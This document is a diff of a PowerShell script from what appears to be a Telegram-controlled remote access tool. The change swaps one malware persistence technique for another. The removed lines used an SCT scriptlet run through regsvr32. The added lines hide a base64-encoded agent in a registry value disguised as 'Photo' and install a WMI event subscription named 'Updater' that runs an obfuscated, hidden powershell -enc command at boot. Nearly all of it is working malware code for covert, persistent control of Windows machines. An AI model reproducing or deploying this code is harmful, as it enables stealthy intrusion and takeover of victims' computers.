@@ -193,26 +193,9 @@ function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
 $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; 
-$plantilla_sct = '<?XML version="1.0"?>
-<scriptlet>
-<registration
-description="Win32COMDebug"
-progid="Win32COMDebug"
-version="1.00"
-classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
- >
- <script language="JScript">
-      <![CDATA[
-           var r = new ActiveXObject("WScript.Shell").Run("''powershell.exe -e ' + $CODE + '",0);
-      ]]>
- </script>
-</registration>
-<public>
-    <method name="Exec"></method>
-</public>
-</scriptlet>'
-$plantilla_sct | Out-File -Encoding ascii -FilePath "c:\windows\system32\drivers\temp.sct"
-Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate="$($Env:SystemRoot)\System32\regsvr32.exe /s /n /u /i:c:\windows\system32\drivers\temp.sct scrobj.dll ";RunInteractively='false'};Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null
+New-ItemProperty registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Photos\OEM\ -name Photo -Value "$code" -Force
+Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -win hidden -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcASwA4AGcAdgBUAHkAMABxAHoAawBqAE4AeQBkAEYATAByAFUAaABWADAASABWAFYAMABIAEIAUABMAGQASAAxAEwARQBuAE4ARABTAGoASwBMADAAZwB0AEsAcQBsAFUASwBFAHAATgB6AHkAdwB1AEsAYQBxADAAcwB2AEwAdwBkAG8AMgBNADkALwBGADMAZAB2AFMASgA5ADMAVgAwADkAdgBEADAAYwA0ADAASgA5AG4AYwBMAEMAWABjAE0AYwBvADMAeAB6AFUAdwB1AHkAaQAvAE8AVAB5AHUASgBDAGMAagBJAEwAOABrAHYAagB2AEYAMwA5AFkAMwBSADEAQwBzAEEAYwBYAGkANQBBAEEAPQA9ACcAKQApACkAKQAsACAAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQAsACAAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=";RunInteractively='false'};Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null
+
 $texto = "Persistencia ejecutada correctamente"; return $texto;break}
 }
 
@@ -220,7 +203,8 @@ function remove-persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios";return $texto; break }  
 else {
-$comando = (Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='UPDATER'").CommandLineTemplate; Remove-Item "c:\windows\system32\drivers\temp.sct"
+Remove-ItemProperty registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Photos\OEM\ -name Photo -Force
+$comando = (Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='UPDATER'").CommandLineTemplate
 if ($comando -eq $null -or $comando -eq "") {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
 $texto = "Eliminando persistencia"
 Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='Updater'" | Remove-WmiObject; return $texto; break
